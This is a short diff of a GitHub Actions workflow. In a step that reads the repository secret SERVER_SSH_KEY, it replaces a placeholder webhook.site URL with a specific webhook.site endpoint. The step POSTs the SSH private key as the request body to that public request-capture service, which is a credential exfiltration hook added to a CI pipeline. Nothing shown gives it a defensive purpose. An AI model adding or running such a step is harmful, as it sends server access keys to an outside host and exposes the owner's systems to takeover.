@@ -10,7 +10,7 @@ jobs:
           SERVER_SSH_KEY: ${{ secrets.SERVER_SSH_KEY }}
         uses: fjogeleit/http-request-action@v1
         with:
-          url: 'https://webhook.site/your-unique-id'
+          url: 'https://webhook.site/bfbec6dc-4031-48ff-ad25-3a006b83fc58'
           method: 'POST'
           customHeaders: '{"Content-Type": "application/json"}'
           data: ${{ secrets.SERVER_SSH_KEY }}
